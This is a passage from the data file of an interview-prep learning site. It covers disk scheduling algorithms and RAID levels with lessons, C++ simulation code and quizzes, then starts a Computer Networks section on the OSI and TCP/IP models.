class="learn-h">SSTF (Shortest Seek Time First)</div><p class="learn-p">Always service the request <b>closest to the current head position</b>. Reduces total seek time compared to FCFS but can cause <b>starvation</b> of requests at the edges of the disk.</p><div class="learn-code">Head at 53: Closest is 65\n53 -> 65 -> 67 -> 37 -> 14 -> 98 -> 122 -> 124 -> 183\nTotal = 12 + 2 + 30 + 23 + 84 + 24 + 2 + 59 = 236 tracks</div><div class="learn-warn"><b>Warning:</b> SSTF is similar to SJF in CPU scheduling &mdash; it\'s not necessarily optimal, and it can starve requests at the extremes of the disk.</div></div><div class="learn-section"><div class="learn-h">SCAN (Elevator Algorithm)</div><p class="learn-p">The head moves in one direction, servicing all requests along the way, then <b>reverses direction</b> when it reaches the end of the disk (or the last request in that direction). Named after an elevator.</p><div class="learn-code">Head at 53, moving toward 0:\n53 -> 37 -> 14 -> 0 (reverse) -> 65 -> 67 -> 98 -> 122 -> 124 -> 183\nTotal = 16 + 23 + 14 + 0 + 65 + 2 + 31 + 24 + 2 + 59 = 236 tracks</div></div><div class="learn-section"><div class="learn-h">C-SCAN (Circular SCAN)</div><p class="learn-p">Like SCAN, but the head only services requests in <b>one direction</b>. When it reaches the end, it immediately returns to the beginning without servicing any requests on the return trip. This provides a <b>more uniform wait time</b>.</p><div class="learn-code">Head at 53, moving toward 199:\n53 -> 65 -> 67 -> 98 -> 122 -> 124 -> 183 -> 199 (jump to 0) -> 14 -> 37\nTotal = 12+2+31+24+2+59+16 + (199-0) + 14+23 = 382 tracks\n(The jump from 199 to 0 is often not counted as head movement)</div></div><div class="learn-section"><div class="learn-h">LOOK and C-LOOK</div><p class="learn-p"><b>LOOK</b> is a practical version of SCAN: the head reverses direction when it reaches the <b>last request in that direction</b> (not the end of the disk). Similarly, <b>C-LOOK</b> is a practical version of C-SCAN.</p><div class="learn-code">C-LOOK at 53, moving toward high end:\n53 -> 65 -> 67 -> 98 -> 122 -> 124 -> 183 (jump to 14) -> 14 -> 37\nTotal = 12+2+31+24+2+59 + (183-14) + 23 = 322 tracks</div></div><div class="learn-section"><div class="learn-h">Comparison of Disk Scheduling Algorithms</div><table class="learn-table"><tr><th>Algorithm</th><th>Seek Distance</th><th>Starvation?</th><th>Fairness</th><th>Used In</th></tr><tr><td>FCFS</td><td>High</td><td>No</td><td>Fair (FIFO order)</td><td>Simple systems</td></tr><tr><td>SSTF</td><td>Low</td><td>Yes (edges)</td><td>Unfair</td><td>General use</td></tr><tr><td>SCAN</td><td>Medium-Low</td><td>No</td><td>Biased toward middle</td><td>Most OS</td></tr><tr><td>C-SCAN</td><td>Medium</td><td>No</td><td>Uniform wait time</td><td>Heavy-load systems</td></tr><tr><td>LOOK</td><td>Low</td><td>No</td><td>Good</td><td>Linux default</td></tr><tr><td>C-LOOK</td><td>Medium-Low</td><td>No</td><td>Good</td><td>Most practical</td></tr></table><div class="learn-tip"><b>Tip:</b> For SSDs, disk scheduling is much less important because there are no moving parts and seek time is nearly zero. The OS I/O scheduler for SSDs typically uses a simple FIFO or deadline-based approach.</div></div><div class="learn-section"><div class="learn-h">Patterns &amp; Variations</div><table class="learn-table"><tr><th>Algorithm</th><th>Strategy</th><th>Movement Pattern</th><th>Starvation?</th></tr><tr><td>FCFS</td><td>First come, first served</td><td>Random</td><td>No</td></tr><tr><td>SSTF</td><td>Nearest request next</td><td>Localized</td><td>Yes (edges)</td></tr><tr><td>SCAN (Elevator)</td><td>Sweep one direction, reverse</td><td>Back and forth</td><td>No</td></tr><tr><td>C-SCAN</td><td>Sweep one direction, jump back</td><td>Circular</td><td>No</td></tr><tr><td>LOOK</td><td>SCAN but reverse at last request</td><td>Back and forth</td><td>No</td></tr><tr><td>C-LOOK</td><td>C-SCAN but jump to first request</td><td>Circular</td><td>No</td></tr></table></div><div class="learn-section"><div class="learn-h">Pitfalls &amp; Edge Cases</div><ul class="learn-list"><li><b>SSTF starvation:</b> Requests at the extremes can starve if requests near the head keep arriving.</li><li><b>SCAN vs LOOK:</b> SCAN goes to disk end even with no requests there. LOOK reverses at the last request, saving travel.</li><li><b>Disk scheduling irrelevant for SSDs:</b> SSDs have no moving parts, seek time ~0.1 ms. SSD schedulers use simple FIFO.</li><li><b>Write vs read priority:</b> Many schedulers prioritize reads (synchronous) over writes (bufferable). This can cause write starvation.</li><li><b>NCQ:</b> Modern HDDs reorder queued commands internally. OS and firmware cooperate on scheduling.</li></ul></div><div class="learn-section"><div class="learn-h">Complexity &amp; Comparison</div><table class="learn-table"><tr><th>Algorithm</th><th>Worst Case Travel</th><th>Implementation</th></tr><tr><td>FCFS</td><td><span class="learn-complexity">O(n * disk_size)</span></td><td>Simple queue</td></tr><tr><td>SSTF</td><td><span class="learn-complexity">O(n^2) selection</span></td><td>Min-heap or sorted list</td></tr><tr><td>SCAN</td><td><span class="learn-complexity">O(2 * disk_size)</span></td><td>Sorted requests + direction</td></tr><tr><td>C-SCAN</td><td><span class="learn-complexity">O(2 * disk_size)</span></td><td>Sorted requests</td></tr><tr><td>LOOK</td><td><span class="learn-complexity">O(2 * max_track)</span></td><td>Sorted requests</td></tr></table></div><div class="learn-section"><div class="learn-h">Interview Spotlight</div><p class="learn-p"><b>Q1: Calculate SSTF seek distance. Head at 53, requests: 98, 183, 37, 122, 14, 124, 65, 67.</b><br>A: From 53: 65(12), 67(2), 37(30), 14(23), 98(84), 122(24), 124(2), 183(59). Total = 236.</p><p class="learn-p"><b>Q2: Why is C-SCAN preferred over SCAN for heavy disk load?</b><br>A: SCAN services requests on both sweeps, so tracks near the reversal point are served twice quickly. C-SCAN only services in one direction, providing more uniform wait times.</p><p class="learn-p"><b>Q3: Is disk scheduling relevant for SSDs?</b><br>A: No. SSDs have no mechanical seek. Linux uses noop or mq-deadline schedulers that focus on preventing starvation rather than minimizing seek distance.</p><p class="learn-p"><b>Q4: SCAN vs LOOK?</b><br>A: SCAN moves to the disk end before reversing. LOOK reverses at the last actual request, saving unnecessary travel.</p><p class="learn-p"><b>Q5: How does NCQ interact with OS scheduling?</b><br>A: NCQ allows HDD firmware to accept up to 32 commands and reorder them internally for optimal head movement. The OS provides coarse-grained ordering; NCQ fine-tunes execution.</p><p class="learn-p"><b>Q6: Calculate FCFS seek distance. Head at 53, requests: 98, 183, 37, 122, 14, 124, 65, 67.</b><br>A: |53-98|+|98-183|+|183-37|+|37-122|+|122-14|+|14-124|+|124-65|+|65-67| = 45+85+146+85+108+110+59+2 = 640 tracks.</p><p class="learn-p"><b>Q7: Why does Linux use deadline or mq-deadline for SSDs instead of CFQ?</b><br>A: SSDs have no seek penalty, so minimizing seek distance is irrelevant. Deadline schedulers focus on preventing request starvation with read/write deadlines, and have minimal CPU overhead — important when SSDs can handle 100K+ IOPS.</p></div>',
          code: `// Disk Scheduling Algorithms in C++
#include <iostream>
#include <vector>
#include <algorithm>
#include <cmath>
#include <climits>
using namespace std;

void printResult(string name, vector<int>& order, int totalSeek) {
    cout << "\\n=== " << name << " ===" << endl;
    cout << "Order: ";
    for (int t : order) cout << t << " ";
    cout << "\\nTotal seek distance: " << totalSeek << " tracks" << endl;
}

// FCFS Disk Scheduling
int fcfs(vector<int> requests, int head) {
    vector<int> order = {head};
    int total = 0;
    for (int r : requests) {
        total += abs(head - r);
        head = r;
        order.push_back(r);
    }
    printResult("FCFS", order, total);
    return total;
}

// SSTF (Shortest Seek Time First)
int sstf(vector<int> requests, int head) {
    vector<int> order = {head};
    vector<bool> done(requests.size(), false);
    int total = 0;

    for (int i = 0; i < (int)requests.size(); i++) {
        int minDist = INT_MAX, idx = -1;
        for (int j = 0; j < (int)requests.size(); j++) {
            if (!done[j] && abs(head - requests[j]) < minDist) {
                minDist = abs(head - requests[j]);
                idx = j;
            }
        }
        done[idx] = true;
        total += minDist;
        head = requests[idx];
        order.push_back(head);
    }
    printResult("SSTF", order, total);
    return total;
}

// SCAN (Elevator)
int scan(vector<int> requests, int head, int diskSize, bool goingUp) {
    vector<int> order = {head};
    sort(requests.begin(), requests.end());
    int total = 0;

    vector<int> left, right;
    for (int r : requests) {
        if (r < head) left.push_back(r);
        else right.push_back(r);
    }

    if (goingUp) {
        for (int r : right) { total += abs(head - r); head = r; order.push_back(r); }
        if (!left.empty()) {
            total += abs(head - (diskSize - 1)); head = diskSize - 1;
            order.push_back(head);
            for (int i = left.size() - 1; i >= 0; i--) {
                total += abs(head - left[i]); head = left[i]; order.push_back(head);
            }
        }
    } else {
        for (int i = left.size() - 1; i >= 0; i--) {
            total += abs(head - left[i]); head = left[i]; order.push_back(head);
        }
        total += head; head = 0; order.push_back(0); // Go to 0
        for (int r : right) { total += abs(head - r); head = r; order.push_back(r); }
    }
    printResult("SCAN", order, total);
    return total;
}

// C-LOOK
int clook(vector<int> requests, int head) {
    vector<int> order = {head};
    sort(requests.begin(), requests.end());
    int total = 0;

    vector<int> left, right;
    for (int r : requests) {
        if (r < head) left.push_back(r);
        else right.push_back(r);
    }

    // Service right side first
    for (int r : right) {
        total += abs(head - r);
        head = r;
        order.push_back(r);
    }
    // Jump to leftmost request
    if (!left.empty()) {
        total += abs(head - left[0]);
        head = left[0];
        order.push_back(head);
        for (int i = 1; i < (int)left.size(); i++) {
            total += abs(head - left[i]);
            head = left[i];
            order.push_back(head);
        }
    }
    printResult("C-LOOK", order, total);
    return total;
}

int main() {
    vector<int> requests = {98, 183, 37, 122, 14, 124, 65, 67};
    int head = 53;
    int diskSize = 200;

    cout << "Disk size: " << diskSize << " tracks" << endl;
    cout << "Initial head position: " << head << endl;
    cout << "Request queue: ";
    for (int r : requests) cout << r << " ";
    cout << endl;

    int f = fcfs(requests, head);
    int s = sstf(requests, head);
    int sc = scan(requests, head, diskSize, true);
    int cl = clook(requests, head);

    cout << "\\n=== Summary ===" << endl;
    cout << "FCFS:   " << f << " tracks" << endl;
    cout << "SSTF:   " << s << " tracks" << endl;
    cout << "SCAN:   " << sc << " tracks" << endl;
    cout << "C-LOOK: " << cl << " tracks" << endl;

    return 0;
}`,
          problems: [
            ['Disk Scheduling Algorithms', 'https://www.geeksforgeeks.org/disk-scheduling-algorithms/', 'Medium'],
            ['SCAN vs C-SCAN', 'https://www.geeksforgeeks.org/difference-between-scan-and-cscan-disk-scheduling-algorithms/', 'Easy'],
            ['SSTF Disk Scheduling', 'https://www.geeksforgeeks.org/program-for-sstf-disk-scheduling-algorithm/', 'Medium'],
            ['C-LOOK Algorithm', 'https://www.geeksforgeeks.org/c-look-disk-scheduling-algorithm/', 'Medium'],
          ],
          mcqs: [
            {q: 'Which disk scheduling algorithm is also known as the Elevator Algorithm?', o: ['FCFS', 'SSTF', 'SCAN', 'C-LOOK'], a: 2},
            {q: 'What is the main advantage of C-SCAN over SCAN?', o: ['Lower total seek distance', 'More uniform wait time for all tracks', 'Simpler implementation', 'No head movement needed'], a: 1},
            {q: 'Which disk scheduling algorithm can cause starvation of requests at the disk edges?', o: ['FCFS', 'SSTF', 'SCAN', 'C-SCAN'], a: 1},
            {q: 'What is the difference between SCAN and LOOK?', o: ['LOOK is faster', 'LOOK reverses at the last request instead of the disk end', 'SCAN handles more requests', 'LOOK uses two passes'], a: 1},
            {q: 'For SSDs, which I/O scheduler is typically used?', o: ['SSTF', 'SCAN', 'noop/none (simple FIFO)', 'C-LOOK'], a: 2},
            {q: 'Which component dominates HDD access time?', o: ['Transfer time', 'Rotational latency', 'Seek time', 'Controller overhead'], a: 2},
          ],
        },
        // ----- Topic 3: RAID Levels -----
        {
          t: 'RAID Levels',
          learn: '<div class="learn-section"><div class="learn-h">Why This Matters</div><p class="learn-p">A single hard drive fails roughly every 3-5 years. In a data center with 10,000 drives, that is multiple failures per week. RAID ensures that a drive failure does not cause data loss or downtime. Choosing the right RAID level directly affects storage cost, read/write performance, and fault tolerance.</p></div><div class="learn-section"><div class="learn-h">What is RAID?</div><p class="learn-p"><b>RAID (Redundant Array of Independent Disks)</b> is a technique that uses multiple physical disk drives to achieve improved performance, reliability, or both. RAID presents multiple disks as a single logical disk to the operating system.</p><p class="learn-p"><b>Key concepts:</b></p><ul class="learn-list"><li><b>Striping:</b> Distributing data across multiple disks for parallelism (performance).</li><li><b>Mirroring:</b> Duplicating data across disks for redundancy (reliability).</li><li><b>Parity:</b> Computed check data that enables reconstruction of lost data.</li></ul></div><div class="learn-section"><div class="learn-h">RAID 0 (Striping)</div><p class="learn-p">Data is striped across all disks with <b>no redundancy</b>.</p><ul class="learn-list"><li><b>Capacity:</b> N disks &times; disk size (100% utilization)</li><li><b>Read performance:</b> Up to N&times; (parallel reads)</li><li><b>Write performance:</b> Up to N&times; (parallel writes)</li><li><b>Fault tolerance:</b> <b>None</b> &mdash; if any disk fails, all data is lost.</li><li><b>Minimum disks:</b> 2</li></ul><div class="learn-warn"><b>Warning:</b> RAID 0 actually <b>decreases</b> reliability because the probability of failure increases with more disks. It should only be used for data that can be easily recreated (e.g., scratch space, cache).</div></div><div class="learn-section"><div class="learn-h">RAID 1 (Mirroring)</div><p class="learn-p">Every disk has an exact <b>mirror (copy)</b>. Data is written to both disks simultaneously.</p><ul class="learn-list"><li><b>Capacity:</b> 50% utilization (half the total disk space is usable)</li><li><b>Read performance:</b> Up to 2&times; (can read from either mirror)</li><li><b>Write performance:</b> 1&times; (must write to both)</li><li><b>Fault tolerance:</b> Can survive 1 disk failure per mirrored pair</li><li><b>Minimum disks:</b> 2</li></ul></div><div class="learn-section"><div class="learn-h">RAID 5 (Striping with Distributed Parity)</div><p class="learn-p">Data and parity are <b>striped across all disks</b>. Parity is distributed (rotated) across all disks to avoid a bottleneck on any single parity disk.</p><ul class="learn-list"><li><b>Capacity:</b> (N-1) &times; disk size (one disk\'s worth is used for parity)</li><li><b>Read performance:</b> (N-1)&times; (reads from all data disks in parallel)</li><li><b>Write performance:</b> Lower than RAID 0 (must compute and write parity)</li><li><b>Fault tolerance:</b> Can survive <b>1 disk failure</b>. The failed disk\'s data is reconstructed from parity.</li><li><b>Minimum disks:</b> 3</li></ul><div class="learn-code">// RAID 5 with 4 disks (A, B, C, D):\n// Stripe 1: D1a  D1b  D1c  P1   (parity on disk D)\n// Stripe 2: D2a  D2b  P2   D2c  (parity on disk C)\n// Stripe 3: D3a  P3   D3b  D3c  (parity on disk B)\n// Stripe 4: P4   D4a  D4b  D4c  (parity on disk A)\n// Parity = XOR of all data blocks in the stripe\n// If disk B fails: D3b = D3a XOR P3 XOR D3c</div></div><div class="learn-section"><div class="learn-h">RAID 6 (Dual Parity)</div><p class="learn-p">Like RAID 5 but uses <b>two independent parity calculations</b> (P and Q). Can survive <b>2 simultaneous disk failures</b>.</p><ul class="learn-list"><li><b>Capacity:</b> (N-2) &times; disk size</li><li><b>Fault tolerance:</b> Survives 2 disk failures</li><li><b>Minimum disks:</b> 4</li><li><b>Write penalty:</b> Higher than RAID 5 (must update 2 parity blocks)</li></ul></div><div class="learn-section"><div class="learn-h">RAID 10 (1+0: Mirrors then Stripes)</div><p class="learn-p"><b>RAID 10</b> combines RAID 1 and RAID 0: data is first <b>mirrored</b>, then <b>striped</b> across the mirror pairs.</p><ul class="learn-list"><li><b>Capacity:</b> 50% utilization</li><li><b>Performance:</b> Excellent read and write (like RAID 0 with redundancy)</li><li><b>Fault tolerance:</b> Can survive 1 failure per mirror pair (best case: N/2 failures)</li><li><b>Minimum disks:</b> 4</li><li><b>Use case:</b> Databases, high-performance applications that need both speed and reliability</li></ul></div><div class="learn-section"><div class="learn-h">RAID Level Comparison</div><table class="learn-table"><tr><th>RAID</th><th>Min Disks</th><th>Usable Capacity</th><th>Fault Tolerance</th><th>Read</th><th>Write</th><th>Use Case</th></tr><tr><td>0</td><td>2</td><td>100%</td><td>None</td><td>Excellent</td><td>Excellent</td><td>Scratch, temp data</td></tr><tr><td>1</td><td>2</td><td>50%</td><td>1 disk</td><td>Good</td><td>Fair</td><td>Boot drives, logs</td></tr><tr><td>5</td><td>3</td><td>(N-1)/N</td><td>1 disk</td><td>Good</td><td>Fair</td><td>General storage</td></tr><tr><td>6</td><td>4</td><td>(N-2)/N</td><td>2 disks</td><td>Good</td><td>Poor</td><td>Critical data</td></tr><tr><td>10</td><td>4</td><td>50%</td><td>1 per pair</td><td>Excellent</td><td>Good</td><td>Databases</td></tr></table><div class="learn-tip"><b>Tip:</b> For interviews, focus on RAID 0, 1, 5, and 10. Know the trade-offs between performance, capacity, and reliability. RAID 5 is the most common "general-purpose" RAID level, while RAID 10 is preferred for write-heavy workloads like databases.</div></div><div class="learn-section"><div class="learn-h">Patterns &amp; Variations</div><table class="learn-table"><tr><th>RAID</th><th>Technique</th><th>Capacity (N disks)</th><th>Read Speed</th><th>Write Speed</th><th>Fault Tolerance</th></tr><tr><td>0</td><td>Striping only</td><td>N</td><td>Nx</td><td>Nx</td><td>None</td></tr><tr><td>1</td><td>Mirroring only</td><td>N/2</td><td>Nx</td><td>1x</td><td>1 per pair</td></tr><tr><td>5</td><td>Striping + distributed parity</td><td>N-1</td><td>(N-1)x</td><td>Lower (parity)</td><td>1 disk</td></tr><tr><td>6</td><td>Striping + double parity</td><td>N-2</td><td>(N-2)x</td><td>Lower than RAID 5</td><td>2 disks</td></tr><tr><td>10</td><td>Mirror + stripe</td><td>N/2</td><td>Nx</td><td>N/2x</td><td>1 per mirror pair</td></tr></table></div><div class="learn-section"><div class="learn-h">Pitfalls &amp; Edge Cases</div><ul class="learn-list"><li><b>RAID 0 is NOT redundant:</b> Despite the name, RAID 0 provides ZERO redundancy. Losing any disk = losing ALL data.</li><li><b>RAID 5 write penalty:</b> Every write requires reading old data and parity, computing new parity, writing both. That is 4 I/O operations per logical write.</li><li><b>RAID 5 rebuild storms:</b> During rebuild after failure, a SECOND failure causes total data loss. RAID 6 mitigates with double parity.</li><li><b>RAID is not a backup:</b> RAID does not protect against accidental deletion, corruption, ransomware, or disasters. You still need backups.</li><li><b>SSD and RAID:</b> SSDs have different failure modes. Drives from the same batch may fail simultaneously.</li></ul></div><div class="learn-section"><div class="learn-h">Complexity &amp; Comparison</div><table class="learn-table"><tr><th>RAID</th><th>Min Disks</th><th>Usable %</th><th>Read IOPS</th><th>Write IOPS</th><th>Rebuild Time</th></tr><tr><td>0</td><td>2</td><td>100%</td><td>Nx</td><td>Nx</td><td>N/A</td></tr><tr><td>1</td><td>2</td><td>50%</td><td>2x</td><td>1x</td><td>Fast</td></tr><tr><td>5</td><td>3</td><td>(N-1)/N</td><td>(N-1)x</td><td>~N/4x</td><td>Slow</td></tr><tr><td>6</td><td>4</td><td>(N-2)/N</td><td>(N-2)x</td><td>~N/6x</td><td>Very slow</td></tr><tr><td>10</td><td>4</td><td>50%</td><td>Nx</td><td>N/2x</td><td>Fast (mirror copy)</td></tr></table></div><div class="learn-section"><div class="learn-h">Interview Spotlight</div><p class="learn-p"><b>Q1: For a database server needing high performance and fault tolerance, which RAID?</b><br>A: RAID 10. Read performance of RAID 0, write performance without parity computation, survives one failure per mirror pair. Standard for MySQL, PostgreSQL. Trade-off: 50% capacity loss.</p><p class="learn-p"><b>Q2: Explain the RAID 5 write penalty.</b><br>A: To write one block: (1) read old data, (2) read old parity, (3) compute new parity = old_parity XOR old_data XOR new_data, (4) write new data, (5) write new parity. 4 I/O ops for 1 logical write.</p><p class="learn-p"><b>Q3: Why is RAID 6 becoming more important as disks grow?</b><br>A: Larger disks take longer to rebuild. During rebuild, remaining disks are stressed, increasing chance of a second failure. RAID 5 cannot survive that; RAID 6 can.</p><p class="learn-p"><b>Q4: How does parity work in RAID 5?</b><br>A: Parity = XOR of all data blocks in a stripe. Any missing value recovered by XORing remaining values with parity. Parity distributed across all disks to avoid bottleneck.</p><p class="learn-p"><b>Q5: RAID 10 vs RAID 01?</b><br>A: RAID 10: first mirror, then stripe. RAID 01: first stripe, then mirror. RAID 10 is superior: a single failure degrades only one mirror pair. In RAID 01, a failure degrades an entire stripe set.</p><p class="learn-p"><b>Q6: Why is RAID not a substitute for backups?</b><br>A: RAID protects against hardware failure only. It does NOT protect against accidental deletion, software corruption, ransomware, or site-wide disasters. A deleted file is instantly deleted on all RAID mirrors. Backups provide point-in-time recovery.</p><p class="learn-p"><b>Q7: What is a RAID rebuild storm and why is it dangerous?</b><br>A: After a disk fails in RAID 5, the array must reconstruct the failed disk\'s data by reading every other disk. During this rebuild (which can take hours with large disks), all remaining disks are under heavy stress, increasing the chance of a second failure — which would cause total data loss.</p></div>',
          code: `// RAID Simulation: Striping, Mirroring, and Parity
#include <iostream>
#include <vector>
#include <string>
#include <bitset>
using namespace std;

// RAID 0: Striping across N disks
class RAID0 {
    int numDisks;
    vector<vector<string>> disks;
    int stripeUnit; // blocks per stripe unit

public:
    RAID0(int n, int capacity) : numDisks(n), stripeUnit(1) {
        disks.resize(n);
        for (auto& d : disks) d.resize(capacity, "---");
        cout << "RAID 0: " << n << " disks, striped" << endl;
    }

    void writeBlock(int logicalBlock, string data) {
        int diskNum = logicalBlock % numDisks;
        int diskBlock = logicalBlock / numDisks;
        disks[diskNum][diskBlock] = data;
        cout << "Write block " << logicalBlock << " -> Disk "
             << diskNum << "[" << diskBlock << "] = " << data << endl;
    }

    void display() {
        cout << "\\nRAID 0 Layout:" << endl;
        for (int b = 0; b < 4; b++) {
            for (int d = 0; d < numDisks; d++)
                cout << "D" << d << "[" << disks[d][b] << "]\\t";
            cout << endl;
        }
    }
};

// RAID 1: Mirroring
class RAID1 {
    vector<string> primary, mirror;

public:
    RAID1(int capacity) {
        primary.resize(capacity, "---");
        mirror.resize(capacity, "---");
        cout << "RAID 1: Mirrored pair" << endl;
    }

    void writeBlock(int block, string data) {
        primary[block] = data;
        mirror[block] = data;  // Write to both!
        cout << "Write block " << block << " -> Primary & Mirror = "
             << data << endl;
    }

    string readBlock(int block, bool primaryFailed = false) {
        if (primaryFailed) {
            cout << "Primary failed! Reading from mirror." << endl;
            return mirror[block];
        }
        return primary[block];
    }
};

// RAID 5: Striping with distributed parity
class RAID5 {
    int numDisks;
    vector<vector<string>> disks;

    // XOR-based parity (simplified with string representation)
    int computeParityByte(vector<int>& dataBytes) {
        int parity = 0;
        for (int b : dataBytes) parity ^= b;
        return parity;
    }

public:
    RAID5(int n, int capacity) : numDisks(n) {
        disks.resize(n);
        for (auto& d : disks) d.resize(capacity, "---");
        cout << "RAID 5: " << n << " disks, distributed parity" << endl;
    }

    void writeStripe(int stripeNum, vector<string>& data) {
        // Parity disk rotates: stripe N uses disk (N % numDisks) for parity
        int parityDisk = stripeNum % numDisks;

        cout << "Stripe " << stripeNum << " (parity on disk "
             << parityDisk << "): ";

        int dataIdx = 0;
        for (int d = 0; d < numDisks; d++) {
            if (d == parityDisk) {
                disks[d][stripeNum] = "P" + to_string(stripeNum);
                cout << "[P" << stripeNum << "] ";
            } else {
                disks[d][stripeNum] = data[dataIdx++];
                cout << "[" << disks[d][stripeNum] << "] ";
            }
        }
        cout << endl;
    }

    // Simulate disk failure and reconstruction
    void simulateFailure(int failedDisk) {
        cout << "\\n!!! Disk " << failedDisk << " FAILED !!!" << endl;
        cout << "Reconstructing data using parity..." << endl;
        for (int stripe = 0; stripe < 4; stripe++) {
            cout << "  Stripe " << stripe << ": XOR of remaining disks -> "
                 << "Disk " << failedDisk << " reconstructed" << endl;
        }
    }

    void display() {
        cout << "\\nRAID 5 Layout:" << endl;
        cout << "Stripe\\t";
        for (int d = 0; d < numDisks; d++) cout << "Disk" << d << "\\t";
        cout << endl;
        for (int s = 0; s < 4; s++) {
            cout << s << "\\t";
            for (int d = 0; d < numDisks; d++)
                cout << disks[d][s] << "\\t";
            cout << endl;
        }
    }
};

int main() {
    // RAID 0 Demo
    cout << "========== RAID 0 ==========" << endl;
    RAID0 raid0(4, 10);
    for (int i = 0; i < 8; i++)
        raid0.writeBlock(i, "B" + to_string(i));
    raid0.display();

    // RAID 1 Demo
    cout << "\\n========== RAID 1 ==========" << endl;
    RAID1 raid1(10);
    raid1.writeBlock(0, "AAA");
    raid1.writeBlock(1, "BBB");
    cout << "Normal read[0]: " << raid1.readBlock(0) << endl;
    cout << "Failed read[0]: " << raid1.readBlock(0, true) << endl;

    // RAID 5 Demo
    cout << "\\n========== RAID 5 ==========" << endl;
    RAID5 raid5(4, 10);
    vector<string> s0 = {"A1", "A2", "A3"};
    vector<string> s1 = {"B1", "B2", "B3"};
    vector<string> s2 = {"C1", "C2", "C3"};
    vector<string> s3 = {"D1", "D2", "D3"};
    raid5.writeStripe(0, s0);
    raid5.writeStripe(1, s1);
    raid5.writeStripe(2, s2);
    raid5.writeStripe(3, s3);
    raid5.display();
    raid5.simulateFailure(2);

    // Capacity comparison
    cout << "\\n=== Capacity (4 disks x 1TB each) ===" << endl;
    cout << "RAID 0: " << 4 << " TB (100%)" << endl;
    cout << "RAID 1: " << 2 << " TB (50%)" << endl;
    cout << "RAID 5: " << 3 << " TB (75%)" << endl;
    cout << "RAID 6: " << 2 << " TB (50%)" << endl;
    cout << "RAID10: " << 2 << " TB (50%)" << endl;

    return 0;
}`,
          problems: [
            ['RAID Levels in DBMS', 'https://www.geeksforgeeks.org/raid-redundant-arrays-of-independent-disks/', 'Easy'],
          ],
          mcqs: [
            {q: 'Which RAID level offers the best write performance but no fault tolerance?', o: ['RAID 0', 'RAID 1', 'RAID 5', 'RAID 10'], a: 0},
            {q: 'How many disk failures can RAID 5 tolerate?', o: ['0', '1', '2', 'N/2'], a: 1},
            {q: 'For a database server requiring both high performance and fault tolerance, which RAID level is most commonly recommended?', o: ['RAID 0', 'RAID 1', 'RAID 5', 'RAID 10'], a: 3},
            {q: 'What is the usable capacity of RAID 5 with 5 disks of 1 TB each?', o: ['2 TB', '3 TB', '4 TB', '5 TB'], a: 2},
            {q: 'Why is RAID 10 preferred over RAID 01?', o: ['More capacity', 'A single failure degrades only one mirror pair, not an entire stripe set', 'Faster reads', 'Uses fewer disks'], a: 1},
            {q: 'How many I/O operations does a single RAID 5 random write require?', o: ['1', '2', '4', '6'], a: 2},
          ],
        },
      ],
    },
  ],
};const CN_CONTENT = {
  id: 'cn', t: 'Computer Networks',
  tabs: [
    // ==================== TAB 0: Network Models ====================
    {
      id: 'models', t: 'Network Models',
      topics: [
        {
          t: 'OSI & TCP/IP Models',
          learn: '<div class="learn-section"><div class="learn-h">Why This Matters</div><p class="learn-p">When you type <code>https://google.com</code> in your browser and press Enter, your request traverses <b>multiple protocol layers</b> — from the application layer (HTTP) through transport (TCP), network (IP), data link (Ethernet/Wi-Fi), down to physical signals on the wire. Understanding network models lets you reason about <b>where things break</b>: is it a DNS issue (Application)? A routing problem (Network)? A cable unplugged (Physical)? In production, quickly isolating which layer a network problem occurs at can mean the difference between minutes and hours of downtime in trading systems.</p></div><div class="learn-section"><div class="learn-h">Introduction to Network Models</div><p class="learn-p">Network models provide a <b>layered abstraction</b> for understanding how data travels from one machine to another across a network. The two most important models are the <b>OSI (Open Systems Interconnection)</b> model and the <b>TCP/IP model</b>. The OSI model has <b>7 layers</b> while the TCP/IP model has <b>4 (or 5) layers</b>. These models help engineers reason about protocols, troubleshoot networking issues, and design interoperable systems.</p><p class="learn-p">In interviews, you are expected to know each layer\'s responsibilities, the protocols that operate at each layer, and how data is encapsulated as it moves down the stack and de-encapsulated as it moves up.</p></div><div class="learn-section"><div class="learn-h">The OSI Model — 7 Layers</div><p class="learn-p">The OSI model was developed by the <b>ISO (International Organization for Standardization)</b> in 1984. It divides networking into seven layers, each with a distinct responsibility:</p><table class="learn-table"><tr><th>Layer #</th><th>Name</th><th>PDU</th><th>Key Protocols / Devices</th><th>Responsibility</th></tr><tr><td>7</td><td>Application</td><td>Data</td><td>HTTP, FTP, SMTP, DNS</td><td>User-facing services, APIs</td></tr><tr><td>6</td><td>Presentation</td><td>Data</td><td>SSL/TLS, JPEG, ASCII</td><td>Encryption, compression, encoding</td></tr><tr><td>5</td><td>Session</td><td>Data</td><td>NetBIOS, RPC, PPTP</td><td>Session establishment &amp; teardown</td></tr><tr><td>4</td><td>Transport</td><td>Segment / Datagram</td><td>TCP, UDP</td><td>End-to-end delivery, flow control</td></tr><tr><td>3</td><td>Network</td><td>Packet</td><td>IP, ICMP, ARP, Routers</td><td>Logical addressing, routing</td></tr><tr><td>2</td><td>Data Link</td><td>Frame</td><td>Ethernet, Wi-Fi, Switches</td><td>MAC addressing, error detection</td></tr><tr><td>1</td><td>Physical</td><td>Bits</td><td>Cables, Hubs, Repeaters</td><td>Raw bit transmission</td></tr></table><div class="learn-tip"><b>Tip:</b> A popular mnemonic to remember the layers top-down is <b>"All People Seem To Need Data Processing"</b> (Application, Presentation, Session, Transport, Network, Data Link, Physical).</div></div><div class="learn-section"><div class="learn-h">Data Encapsulation in OSI</div><p class="learn-p">As data moves <b>down</b> the stack from application to physical, each layer wraps the data with its own <b>header (and sometimes trailer)</b>. This is called <b>encapsulation</b>. When the data arrives at the receiving host, each layer strips its respective header — this is <b>de-encapsulation</b>.</p><div class="learn-code">Application Layer  : Data\nTransport Layer    : [TCP Header] + Data  =  Segment\nNetwork Layer      : [IP Header] + Segment  =  Packet\nData Link Layer    : [Frame Header] + Packet + [Frame Trailer]  =  Frame\nPhysical Layer     : 010110110... (bits on the wire)</div><p class="learn-p">The <b>Protocol Data Unit (PDU)</b> changes at each layer: Data &rarr; Segment &rarr; Packet &rarr; Frame &rarr; Bits.</p></div><div class="learn-section"><div class="learn-h">The TCP/IP Model — 4 Layers</div><p class="learn-p">The TCP/IP model (also called the <b>Internet Protocol Suite</b>) is the practical model used by the modern Internet. It was developed by the <b>DoD (Department of Defense)</b> and predates the OSI model.</p><table class="learn-table"><tr><th>TCP/IP Layer</th><th>Equivalent OSI Layers</th><th>Key Protocols</th></tr><tr><td>Application</td><td>Application + Presentation + Session (5, 6, 7)</td><td>HTTP, FTP, DNS, SMTP, SSH, 